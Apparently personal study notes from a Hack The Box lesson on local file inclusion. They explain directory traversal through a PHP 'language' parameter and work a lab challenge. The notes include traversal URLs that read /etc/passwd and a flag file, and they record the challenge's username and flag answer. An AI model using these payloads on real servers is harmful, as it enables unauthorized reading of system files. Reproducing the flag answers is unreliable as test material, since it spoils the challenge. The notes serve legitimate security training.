@@ -1,1 +1,36 @@
 
+in the example it shows us going to our URL set up then changing the langauge preference -> which turns into a url of http://<SERVER_IP>:<PORT>/index.php?language=es.php
+
+playing around with it seeing as its pulling a page from the backend server we can try-> 
+
+http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd 
+
+which it shows it is indeed vulnerable. 
+
+ However, in many occasions, web developers may append or prepend a string to the language parameter. For example, the language parameter may be used for the filename, and may be added after a directory, as follows:
+
+EXAMPLE: include("./languages/" . $_GET['language']);
+
+so to get around this parameter we would need -> 
+
+http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/passwd
+
+We can easily bypass this restriction by traversing directories using relative paths. To do so, we can add ../ before our file name, which refers to the parent directory. For example, if the full path of the languages directory is /var/www/html/languages/, then using ../index.php would refer to the index.php file on the parent directory (i.e. /var/www/html/index.php).
+
+
+Tip: It can always be useful to be efficient and not add unnecessary ../ several times, especially if we were writing a report or writing an exploit. So, always try to find the minimum number of ../ that works and use it. You may also be able to calculate how many directories you are away from the root path and use that many. For example, with /var/www/html/ we are 3 directories away from the root path, so we can use ../ 3 times (i.e. ../../../).
+
+CHALLENGE: 94.237.59.237:46052
+
+
+Question 1 - Using the file inclusion find the name of a user on the system that starts with "b".
+1) go to http://94.237.59.237:46052
+2) click on the language tab just as they showed in the section
+3) continue to add paths to /tc/passwd after index.php?language= 
+4) we end up on http://94.237.59.237:46052/index.php?language=../../../../etc/passwd
+5) we find user nameed barry 
+
+
+Question 2 - Submit the contents of the flag.txt file located in the /usr/share/flags directory.
+1) following same method as above... we end up with: http://94.237.59.237:46052/index.php?language=../../../../usr/share/flags/flag.txt
+2) output: HTB{n3v3r_tru$t_u$3r_!nput}
